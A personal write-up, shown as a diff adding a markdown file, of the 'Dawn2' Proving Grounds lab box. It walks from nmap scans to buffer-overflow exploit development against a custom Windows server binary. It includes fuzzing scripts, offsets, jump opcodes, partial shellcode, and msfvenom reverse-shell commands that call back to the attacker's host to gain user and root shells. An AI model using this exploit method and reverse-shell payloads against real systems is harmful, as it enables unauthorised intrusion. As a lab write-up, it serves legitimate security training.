@@ -1,0 +1,416 @@
+Finally getting around to finishing this writeup. Dawn2 was the most enjoyable box I've done in the short time I've been pwning boxes as well as one that I'm actually allowed to write about (since I'm pretty much just pwning offsec boxes that have strict write up rules and when I finally pwn a real life one at work - pretty sure I can't do a writeup on that either) - and while not a difficult box per se, the way I solved the box was memorable to me and sort of highlights the experience of problem solving. Penetration testing is, at it's core, Problem Solving. And I think this box really espouses that quality. The box has also helped me understand memory corruption exploits a little better.
+
+Shout out to whitecr0wz for authoring this box! and my friend vrvik @ https://github.com/ruthvikvegunta for working with me on this... even though we came at different conclusions, his solution actually helped me further understand my reasonings.
+
+I am going to be doing this box on Offensive Security's Proving Grounds so unfortunately no sick banners when you finally get the root flag but because of the plug and play nature of the platform you don't have to do netdiscover or an nmap scan of your environment to find the box so there's that lol.
+
+Let's look at the output of a generic nmap -A type scan. 
+
+(Full disclosure I just run ```autorecon``` for most things cause it automates the boring stuff - but **understand that, without customization, autorecon simply queues the most vanilla of scans for you** and if you don't find anything with automated methods always be prepared to do things "manually")
+
+
+```
+Host is up, received user-set (0.023s latency).
+Scanned at 2020-10-09 11:49:06 EDT for 61s
+Not shown: 65532 closed ports
+Reason: 65532 resets
+PORT     STATE SERVICE   REASON         VERSION
+80/tcp   open  http      syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+1435/tcp open  ibm-cics? syn-ack ttl 63
+1985/tcp open  hsrp?     syn-ack ttl 63
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port1435-TCP:V=7.80%I=9%D=10/9%Time=5F80869D%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,4,"\r\n\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port1985-TCP:V=7.80%I=9%D=10/9%Time=5F80869D%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,4,"\r\n\r\n");
+Device type: general purpose|VoIP phone|storage-misc|media device|firewall|phone
+Running (JUST GUESSING): Linux 3.X|2.6.X|4.X (98%), Grandstream embedded (94%), Synology DiskStation Manager 5.X (94%), Tiandy embedded (94%), IPFire 2.X (94%), Google Android 5.X (93%)
+OS CPE: cpe:/o:linux:linux_kernel:3.18 cpe:/h:grandstream:gxv3275 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/a:synology:diskstation_manager:5.1 cpe:/o:ipfire:ipfire:2.11 cpe:/o:google:android:5.0.1
+Aggressive OS guesses: Linux 3.18 (98%), Grandstream GXV3275 video phone (94%), Linux 2.6.32 (94%), Linux 3.11 - 4.1 (94%), Linux 3.2 (94%), Linux 3.2 - 3.8 (94%), Linux 3.4 (94%), Linux 3.5 (94%), Linux 3.8 (94%), Linux 4.2 (94%)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/9%OT=80%CT=1%CU=41718%PV=Y%DS=2%DC=T%G=Y%TM=5F8086A
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%TS=A)SEQ(SP=101%GC
+OS:D=1%ISR=103%TI=Z%II=I%TS=B)SEQ(TI=Z%II=I%TS=A)OPS(O1=M54EST11NW7%O2=M54E
+OS:ST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)WIN(W1
+OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O
+OS:=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
+OS:)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=N)T6(R=N)T7(R
+OS:=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
+OS:Y%DFI=N%T=40%CD=S)
+```
+
+
+So far I can tell that Dawn2 is running 3 services on port 80,1435 and 1985; a web server and two unknown, possibly custom, services. And I'll save you the time and tell you that the output from nikto and gobuster (with the famous common.txt wordlist anyways) doesn't return anything interesting. And since nmap wasn't able to finger print the two services, the best way forward is to see what is on the webserver itself. We could always fall back to scanning UDP ports or instrusively try to generate a response from the services (netcat,python etc) as a last resort.
+
+**insert screenshot**
+
+Fortunately, I'm presented an "Under Construction" type webpage that also felt the need to tell everyone some pretty sensitive information. For example - You really don't want to let the world know that you do not have an IDS, a WAF or a functioning security team for that matter. 
+
+And you **really** do not want to provide to anyone that asks - a copy of your custom server software.
+
+**screenshot of download**
+
+Complete with debugging notes.
+
+```
+DAWN Multi Server - Version 1.1
+
+Important:
+
+Due the lack of implementation of the Dawn client, many issues may be experienced, such as the message not being delivered. In order to make sure the connection is finished and the message well received, send a NULL-byte at the ending of your message. 
+Also, the service may crash after several requests.
+
+Sorry for the inconvenience!
+```
+
+Perfect now I know how to interact with this software and that this service is prone to crashing after interacting with it several times. This means traditional fuzzing will not work but that's fine. Let's double check the binary we were given with ```file```
+
+```
+dawn.exe: PE32 executable (console) Intel 80386, for MS Windows
+```
+
+Interesting... even though nmap (and the PG platform) points to this being a linux box, the server that's running on the machine is a MS-Windows executable, this means that this is being run with WINE or equivalent and may affect the exploit (Which I'm feeling is a memory corruption type). Just something to keep in mind but I have a solid lead anyways so let's start the exploit development process.
+
+I have a windows vm with immunity on a separate box for exploit development cause I'd rather keep vulnerable binaries in a separate environment. So transfer over the 
+dawn.exe binary to your windows environment of choice with whatever method you like - I personally like using ```certutil`` or just ```wget``` on powershell (3+ I think) to your python webserver and launch the dawn.exe server via immunity.
+
+I'll also provide a boilerplate so you can jump in and follow along if you are familiar with buffer overflow exploit development but I sort of encourage everyone to make their own, being able to make a ~~shitty~~ simple tcp client is kind of useful and it's fun!
+
+```
+#!/usr/bin/python3
+#boiler plate for TCP things.
+
+import socket
+import sys
+
+def connect():
+    try:
+        RHOST = sys.argv[1]
+        RPORT = int(sys.argv[2])
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print ("connecting to %s port %s"% (RHOST, RPORT))
+        sock.connect((RHOST, RPORT))
+        sock.send()
+        sock.close()
+        print ("DONE")
+    except:
+        print ("FAIL")
+connect()
+```
+
+It's fairly straightforward it's a simple tcp client takes two arguments the target IP and the port of the service and prints out status messages, I like to put things inside of functions cause it keeps things a little neat in my head. Also note that I haven't included a main() function yet and I'm just calling the function connect() directly - If you didn't know Python (unlike other languages) doesn't actually care about entrypoints ilke main() but it's always good practice to do that for readability.. however since this is still the development phase I like to play things loose.
+
+Since I know that the program is unstable as indicated by the README file. Let's just yeet a payload... 1000 sounds like a a nice round number (even though the actual payload will be 1001 including the NULL byte but shhhh) let's send a unique string of that length via ```msf-pattern_create -l 1000```
+
+```
+      RPORT = int(sys.argv[2])
+      CRASH = b"**msf-pattern output**"
+      TERMINATE = b"\x00" # AS PER README
+      buffer = CRASH + TERMINATE
+...
+      sock.sent(buffer)
+```
+
+But first let's double check our windows box with nmap.
+
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 14:45 EST
+Nmap scan report for 10.0.0.190
+Host is up (0.0051s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+1985/tcp open  hsrp
+5357/tcp open  wsdapi
+
+Nmap done: 1 IP address (1 host up) scanned in 106.10 seconds
+```
+
+Awesome, we know from the scan for Dawn2 1985 was the port of the unknown service so we're definitely somewhere. Interestingly scanning seems to have crashed the service.
+
+**insert image of crash**
+
+But if we interact with the service running on Dawn2 with netcat
+
+```
+┌──(trshpnda㉿kali)-[~/Downloads/dawn]
+└─$ echo -ne "\x00" | nc 192.168.70.12 1985                                                                                                                                                    
+
+┌──(trshpnda㉿kali)-[~/Downloads/dawn]
+└─$ echo -ne "\x00" | nc 192.168.70.12 1985
+Ncat: Connection refused.
+```
+
+Cool even though we are crashing it with our scans - the server is being restarted periodically, and if this isn't the case thankfully we could always "revert" the box and try again. There's a lesson here somewhere about OPSEC and being careful when testing someone's stuff fortunately this is just pretend and besides it's not like they have a security team either ;D
+
+Let's restart our copy of the server with immunity and send our payload
+
+**PICTURE OF INITIAL CRASH**
+
+See where the instruction pointer is? Dead Giveaway for SEH (I'll explain what that is in a bit). And If we step through it.
+
+**PICTURE OF INSTRUCTION POINTER**
+
+Yup, looks like a SEH overflow. We can see our unique string of *42346142* in both the EIP and the SEH Chain window. 42346142 itself translates to Ba4B (accounting for endianess)
+
+But first let's talk a little about SEH, SEH or Structured Error Handling is essentially Microsoft's way of dealing with unexpected errors (such as crashes) unfortunately it is also vulnerable to overflows as well... but also unfortunately crafting a viable exploit is a little more involved, can't just use any old pointer address cause they usually doesn't point to anything viable at the time of the crash and **AFAIK** we're also going to need a "pop pop return" instruction for an exploit to be viable usually in order to properly hijack the execution flow.
+
+(Full Disclosure I just throw shit at shit, see what happens then google alot, so this topic is definitely worth exploring more in depth if binary exploitation is your thing)
+
+Let's restart our server...
+So now we know where the pointer lands in our unique string we just utilize ```msf-pattern_offset -l 1000 -q 42346142``` to find our offsets.
+
+```
+┌──(trshpnda㉿kali)-[~/Downloads/dawn]
+└─$ msf-pattern_offset -l 1000 -q 42346142
+[*] Exact match at offset 792
+```
+And with a little bit of math.
+```
+        CRASH = b"\x41" * 792 #EIP lands after this
+        EIP = b"\x42" * 4 # Remember EIP is 4 bytes
+        Filler = b"\x43" * 204 #Filler because we need to send 1001 bytes to trigger the crash
+        TERMINATE = b"\x00"
+        buffer = CRASH + EIP + Filler + TERMINATE
+```
+
+Resend our payload 
+
+**insert screenshot of EIP**
+
+and as indicated by our 42s we have control of the instruction pointer, also double checking the DUMP output it looks like we only actually have 128 bytes to play with (78+8 in Hex = 128 Decimal, meaning our payload would only actually be 925 bytes) chalk it up to our yolo nature of our fuzzing... now to see if we can actually control the execution flow.
+
+Let's restart the server and search for a usuable module via ```!mona modules```
+
+**screenshot of modules**
+
+we can see only the dawn.exe module itself is usuable because it has an address that doesn't begin with a null byte as well as not having being compiled with any protections. If we do ```!mona seh -r dawn.exe -cpb "\x00"``` it'll tell immunity do search for pop pop ret addresses inside of dawn.exe while also filtering out any addresses that begin with a NULL byte as well as writing it out to a text file. It'll give you alot of potential addresses to use let's try "\xBA\x59\x58\x34" (endianess)
+
+At this point we would also test for bad characters, we would send all 255 Extended-ASCII characters in hexformat (\x01\x02\..) to see if there was any wierd behaviour in the application dump - NULL bytes, duplication etc which would affect our shellcode. (Remember, we only have 128 in the filler section so we'll have to split and pad it accordingly)
+
+**SCREENS OF DUMPS**
+
+Cool looks clean.
+
+So lets set a breakpoint on "0x345859BA" in immunity and see if we hit it.
+
+**Screen of Hit**
+
+**Screen of As**
+
+Cool, looks like we have 4 bytes of space to play with before our POP POP RET address. Which is more than enough for some JMP SHORTs, we can look for these codes using ```msf-nasm_shell```
+
+Doing some quick maths (and some trial and error cause I can't actually count) we want two Opcodes one jmp short to go -5 and one regular jmp to go -782 to the start of our payload.
+```
+nasm > JMP SHORT -5
+00000000  EBF9              jmp short 0xfffffffb
+nasm > JMP -782
+00000000  E9EDFCFFFF        jmp 0xfffffcf2
+nasm > 
+
+```
+
+Add these two our code as such,
+
+```
+        CRASH = b"\x41" * 783
+        JMP = b"\xE9\xED\xFC\xFF\xFF"
+        SRTJMP = b"\xEB\xF9\x90\x90"
+        EIP = b"\xBA\x59\x58\x34"
+        FILLER =b"\x43" * 128
+        TERMINATE = b"\x00"
+        buffer = CRASH + JMP + SRTJMP + EIP + FILLER + TERMINATE
+
+```
+
+**Insert ROW of As and the JMP**
+
+So now that we know we have effectively hijacked the execution flow into a spot where our shellcode can live and I'm fairly confident with my counting skills. We can launch the server independently as well as generate our shellcode via ```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.165 LPORT=1985 -f py -v SHELL -b "\x00"``` notice how I'm using the same port as the service... There's a higher chance of recieving a reverseshell back if you use a port that's open on the target system because of things like firewall rules. Now obviously this isn't always the case but it's a more logical way of going about things than randomly using any old port.
+
+```
+        NOPS = b"\x90" * 20
+        SHELL =  b""
+        SHELL += b"\xd9\xec\xbf\xc5\x91\xf7\xf7\xd9\x74\x24\xf4\x5e"
+...
+        SHELL += b"\x28\x18\xc8"
+        CRASH2 = b"\x41" * (783 - (len(SHELL) + len(NOPS))) #Python does not do BEDMAS Hence the () overload.
+        JMP = b"\xE9\xED\xFC\xFF\xFF"
+        SRTJMP = b"\xEB\xF9\x90\x90"
+        EIP = b"\xBA\x59\x58\x34"
+        FILLER =b"\x43" * 128
+        TERMINATE = b"\x00"
+        buffer = NOPS + SHELL + CRASH2 + JMP + SRTJMP + EIP + FILLER + TERMINATE
+        print (len(buffer))
+```
+
+The "guts" of the exploit should look something like that. Some people may snob their nose at using a NOP sled but we got the space so why not use it? ;P
+
+And...
+
+**insert gif**
+
+voila! we have a working proof of concept. 
+
+and just for a bit more fun...
+
+**insert rick roll**
+
+(I had to refactor the exploit into python2 for the msfvenom payload to work - don't ask, I'm not sure either, something something bytes and whitespace I think)
+
+Anyways... let's try it out on our linux target, replacing the SHELL payload with ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.70 LPORT=1985 -f py -v SHELL -b "\x00"```
+
+**Screen Shot**
+
+And it doesn't work... In my limited experience SEH exploits can be tricky - remember how the server might possible be running on WINE?, the memory addresses in the POP POP RET instruction we picked most likely do not reside in the same memory space as the one running on our target box and especially with how tight I placed my jumps would screw up where our instruction pointer lands. Or we may have made a mistake somewhere along the line.
+
+Now let's assume we haven't made a mistake... we're faced with two possible options, one where we play with our jumps and nops and hope it hits or look into egg hunting techniques as a potential solution.
+
+# **Or...** 
+What if we can create a crash environment where we have control of the instruction pointer without triggering the SEH?
+
+Might be a longshot but the former options are kind of annoying and this would be interesting to pull off.
+
+I know that anything after 925 bytes the exploit will trigger the SEH and overflow it. Let's pick a random value once again... 750 sounds good, it reminds me of the price of two street hotdogs here in Toronto (one with cheese).
+
+Going through the whole cycle of generating a unique string, finding the offset and doing the "x41x42x43" dance
+
+**insert picture of new crash**
+
+we have more vanilla bufferoverflow scenario where the R/ESP register is pointing nicely to our shellcode at the time of the crash with plenty of space to play with and right after our EIP address as well.
+
+Do a search for a suitable jump or call esp address
+
+**jmp esp**
+
+Nice and finally after figuring out the appropriate padding and inserting a windows payload for the poc.
+
+```
+        CRASH = b"\x41" * 272
+        EIP = b"\xBA\x64\x59\x34"
+        SHELL =  b""
+        SHELL += b"\xb8\xa1\x78\x37\xe4\xda\xce\xd9\x74\x24\xf4\x5a"
+...
+        SHELL += b"\xd3\xf9\x97\x84\xd6\x46\x10\x75\xab\xd7\xf5\x79"
+        SHELL += b"\x18\xd7\xdf"
+        NOPS = b"\x90" * 20
+        FILLER = b"\x43" * (474 - (len(SHELL) + len(NOPS)))
+        TERMINATE = b"\x00"
+        buffer = CRASH + EIP + NOPS + SHELL + FILLER + TERMINATE
+```
+
+
+**shell gif**
+
+We get a shell on our windows box.
+
+**shell linux gif**
+
+And after swapping our payload, a shell on our linux box.
+
+**screenshot of ls**
+
+After some brief enumeration I notice a dawnBETA.exe windows binary.
+
+**confirm root**
+
+It's being run as root... and is most likely the other unknown service running on this box.
+
+Cool! The process begins again... let's go through the whole cycle once again aiming at a non-SEH exploit.
+
+**gif of dawnroot**
+
+And we have a successful exploit resulting in a root shell.
+
+My apologies if you were hoping for a writeup that more thoroughly explained the process of bufferoverflow exploit development, in my defense there's plenty of people out there that do a better job (hint, the author of this box is one of them ;D) what I really wanted to capture with this write up was the art of creative problem solving.
+
+Being able to step back, come up with a different approach and explore it even if the chance of failure was high.
+
+Thanks alot for reading this! 
+
+Cheers!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
